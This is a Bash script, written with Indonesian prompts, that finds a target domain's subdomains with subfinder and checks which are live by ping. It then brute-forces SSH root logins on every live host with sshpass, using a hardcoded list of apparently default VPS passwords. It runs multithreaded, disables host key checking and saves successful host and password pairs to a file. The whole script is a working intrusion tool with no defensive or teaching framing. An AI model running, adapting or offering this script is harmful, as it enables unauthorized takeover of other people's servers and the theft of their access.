#!/bin/bash

read -p "Masukkan domain utama (contoh: example.com): " DOMAIN
read -p "Masukkan nama file untuk menyimpan hasil (tanpa ekstensi .txt): " FILEBASE
read -p "Masukkan jumlah thread (default: 5): " THREADS
THREADS=${THREADS:-5}
USER="root"

PASSLIST=("VPSKONTOL#32GB" "VPSKONTOL#16GB" "SYAH#16GB" "KENNY#16GB" "KENNY#32GB" "SYAH#32GB")

echo "[*] Menjalankan subfinder..."
subfinder -d "$DOMAIN" -silent > temp_allsubs.txt

echo "[*] Mengecek subdomain yang aktif..."
> "$FILEBASE"_subdomain.txt
> "$FILEBASE"_work.txt
> "$FILEBASE"_gagal.txt

while read SUB; do
  ping -c 1 -W 1 "$SUB" > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo " Aktif: $SUB"
    echo "$SUB" >> "$FILEBASE"_subdomain.txt
  else
    echo " Mati: $SUB"
  fi
done < temp_allsubs.txt

rm temp_allsubs.txt

# Brute function
brute_ssh() {
  SUB=$1
  for PASS in "${PASSLIST[@]}"; do
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USER@$SUB" "exit" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
      echo " Berhasil $SUB | $PASS"
      echo "$SUB|$PASS" >> "$FILEBASE"_work.txt
      return
    fi
  done
  echo " Gagal semua: $SUB"
  for PASS in "${PASSLIST[@]}"; do
    echo "$SUB|$PASS" >> "$FILEBASE"_gagal.txt
  done
}

export -f brute_ssh
export FILEBASE USER PASSLIST

echo -e "\n[*] Mulai brute SSH dengan $THREADS thread...\n"

running=0
while read SUB; do
  brute_ssh "$SUB" &
  ((running++))

  if [[ $running -ge $THREADS ]]; then
    wait -n
    ((running--))
  fi
done < "$FILEBASE"_subdomain.txt

wait

echo -e "\n Selesai!\n- Subdomain aktif: $FILEBASE"_subdomain.txt"\n- Login OK: $FILEBASE"_work.txt"\n- Login Gagal: $FILEBASE"_gagal.txt""

